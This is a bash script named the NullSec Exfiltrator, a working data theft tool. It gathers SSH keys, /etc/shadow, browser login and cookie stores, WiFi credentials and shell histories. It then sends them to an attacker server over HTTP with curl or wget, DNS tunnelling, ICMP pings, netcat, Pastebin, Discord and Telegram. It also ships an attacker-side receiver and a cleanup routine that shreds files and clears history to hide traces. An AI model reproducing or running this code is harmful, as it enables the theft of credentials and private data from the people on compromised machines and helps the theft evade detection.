#!/bin/bash
#===============================================================================
#  NULLSEC EXFILTRATOR - Advanced Data Exfiltration Suite
#===============================================================================

STAGING_DIR="/tmp/.nullsec_staging"
LOOT_DIR="/root/loot/nullsec-exfil"
mkdir -p "$STAGING_DIR" "$LOOT_DIR"

# Exfil server config (customize)
EXFIL_SERVER="${EXFIL_SERVER:-192.168.1.100}"
EXFIL_PORT="${EXFIL_PORT:-8443}"
DNS_EXFIL_DOMAIN="${DNS_EXFIL_DOMAIN:-data.nullsec.local}"

log() { echo -e "\033[0;32m[+]\033[0m $1"; }

# Collect interesting files
collect_loot() {
    log "Collecting loot..."
    
    # SSH keys
    find /home /root -name "id_*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | while read f; do
        cp "$f" "$STAGING_DIR/" 2>/dev/null
    done
    
    # Config files with potential creds
    for f in /etc/shadow /etc/passwd /etc/hosts; do
        [[ -r "$f" ]] && cp "$f" "$STAGING_DIR/"
    done
    
    # Browser data
    find /home -type f \( -name "*.sqlite" -o -name "Login Data" -o -name "cookies*" \) 2>/dev/null | while read f; do
        cp "$f" "$STAGING_DIR/" 2>/dev/null
    done
    
    # WiFi passwords
    find /etc/NetworkManager/system-connections -type f 2>/dev/null | while read f; do
        cp "$f" "$STAGING_DIR/" 2>/dev/null
    done
    
    # Command history
    cat /home/*/.bash_history /root/.bash_history >> "$STAGING_DIR/bash_history.txt" 2>/dev/null
    
    # Compress
    tar czf "$STAGING_DIR/loot.tar.gz" -C "$STAGING_DIR" . 2>/dev/null
    log "Loot staged: $STAGING_DIR/loot.tar.gz"
}

# HTTP/HTTPS exfil
exfil_http() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    log "Exfiltrating via HTTP to $EXFIL_SERVER:$EXFIL_PORT"
    
    # Try curl first
    if command -v curl &>/dev/null; then
        curl -k -X POST "https://$EXFIL_SERVER:$EXFIL_PORT/upload" \
            -F "file=@$file" -F "host=$(hostname)" 2>/dev/null && return 0
    fi
    
    # Fallback to wget
    if command -v wget &>/dev/null; then
        wget --post-file="$file" "https://$EXFIL_SERVER:$EXFIL_PORT/upload" -O /dev/null 2>/dev/null
    fi
}

# DNS exfil (slow but stealthy)
exfil_dns() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    log "Exfiltrating via DNS to $DNS_EXFIL_DOMAIN (slow but stealthy)"
    
    # Base64 encode and split into chunks
    local data=$(base64 -w0 "$file" | tr '+/' '-_')
    local chunk_size=60
    local seq=0
    local total=$((${#data} / chunk_size + 1))
    
    while [[ ${#data} -gt 0 ]]; do
        local chunk="${data:0:$chunk_size}"
        data="${data:$chunk_size}"
        
        # Send as DNS query
        dig "$seq.$chunk.$DNS_EXFIL_DOMAIN" @"$EXFIL_SERVER" +short >/dev/null 2>&1
        
        ((seq++))
        log "DNS chunk $seq/$total sent"
        sleep 0.5  # Avoid detection
    done
    
    # Send end marker
    dig "END.$(hostname).$DNS_EXFIL_DOMAIN" @"$EXFIL_SERVER" +short >/dev/null 2>&1
}

# ICMP exfil (ping tunnel)
exfil_icmp() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    log "Exfiltrating via ICMP to $EXFIL_SERVER"
    
    # XXD hex encode and send in ping payload
    xxd -p "$file" | while read -n 32 chunk; do
        ping -c 1 -p "$chunk" "$EXFIL_SERVER" >/dev/null 2>&1
        sleep 0.1
    done
}

# NetCat exfil
exfil_nc() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    log "Exfiltrating via NetCat to $EXFIL_SERVER:$EXFIL_PORT"
    
    cat "$file" | nc "$EXFIL_SERVER" "$EXFIL_PORT" 2>/dev/null || \
    cat "$file" | nc -w 5 "$EXFIL_SERVER" "$EXFIL_PORT" 2>/dev/null
}

# Local USB exfil
exfil_usb() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    
    # Find USB drives
    for usb in /media/* /mnt/*; do
        if mountpoint -q "$usb" 2>/dev/null; then
            local dest="$usb/.nullsec_$(hostname)_$(date +%s).tar.gz"
            cp "$file" "$dest" && log "Exfiltrated to USB: $dest"
            return 0
        fi
    done
    
    warn "No USB drive found"
    return 1
}

# Cloud exfil (various services)
exfil_cloud() {
    local file="${1:-$STAGING_DIR/loot.tar.gz}"
    
    # Pastebin (for small data)
    if [[ $(stat -c%s "$file") -lt 500000 ]]; then
        local data=$(base64 -w0 "$file")
        curl -s -X POST "https://pastebin.com/api/api_post.php" \
            -d "api_dev_key=${PASTEBIN_KEY:-}" \
            -d "api_paste_code=$data" \
            -d "api_option=paste" 2>/dev/null
    fi
    
    # Discord webhook
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        curl -F "file=@$file" "$DISCORD_WEBHOOK" 2>/dev/null
    fi
    
    # Telegram
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -F "document=@$file" \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}" 2>/dev/null
    fi
}

# Start exfil receiver (run on attacker machine)
start_receiver() {
    local port="${1:-$EXFIL_PORT}"
    log "Starting exfil receiver on port $port"
    
    mkdir -p "$LOOT_DIR/incoming"
    cd "$LOOT_DIR/incoming"
    
    # Python HTTP receiver
    python3 << 'RECEIVER'
import http.server
import socketserver
import cgi
import os
from datetime import datetime

class ExfilHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        
        if 'file' in form:
            fileitem = form['file']
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"loot_{timestamp}_{fileitem.filename}"
            
            with open(filename, 'wb') as f:
                f.write(fileitem.file.read())
            
            print(f"[+] Received: {filename}")
            
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

PORT = int(os.environ.get('EXFIL_PORT', 8443))
with socketserver.TCPServer(("", PORT), ExfilHandler) as httpd:
    print(f"[+] NullSec Exfil Receiver on port {PORT}")
    httpd.serve_forever()
RECEIVER
}

# Auto exfil with fallbacks
auto_exfil() {
    collect_loot
    
    log "Attempting exfiltration with fallbacks..."
    
    # Try methods in order of reliability
    exfil_http && { log "HTTP exfil successful"; return 0; }
    exfil_nc && { log "NC exfil successful"; return 0; }
    exfil_usb && { log "USB exfil successful"; return 0; }
    exfil_dns && { log "DNS exfil successful"; return 0; }
    
    warn "All exfil methods failed"
    return 1
}

# Cleanup traces
cleanup() {
    log "Cleaning up traces..."
    shred -u "$STAGING_DIR"/* 2>/dev/null
    rm -rf "$STAGING_DIR"
    history -c
    log "Cleanup complete"
}

case "${1:-menu}" in
    collect) collect_loot ;;
    http) shift; exfil_http "$@" ;;
    dns) shift; exfil_dns "$@" ;;
    icmp) shift; exfil_icmp "$@" ;;
    nc) shift; exfil_nc "$@" ;;
    usb) shift; exfil_usb "$@" ;;
    cloud) shift; exfil_cloud "$@" ;;
    auto) auto_exfil ;;
    receiver) shift; start_receiver "$@" ;;
    cleanup) cleanup ;;
    *)
        echo "NullSec Exfiltrator"
        echo "Usage: $0 <command> [options]"
        echo ""
        echo "Commands:"
        echo "  collect           - Collect interesting files"
        echo "  http [file]       - HTTP POST exfil"
        echo "  dns [file]        - DNS tunneling exfil"
        echo "  icmp [file]       - ICMP ping exfil"
        echo "  nc [file]         - NetCat exfil"
        echo "  usb [file]        - USB drive exfil"
        echo "  cloud [file]      - Cloud service exfil"
        echo "  auto              - Auto exfil with fallbacks"
        echo "  receiver [port]   - Start exfil receiver"
        echo "  cleanup           - Remove traces"
        echo ""
        echo "Environment variables:"
        echo "  EXFIL_SERVER, EXFIL_PORT, DNS_EXFIL_DOMAIN"
        echo "  DISCORD_WEBHOOK, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID"
        ;;
esac
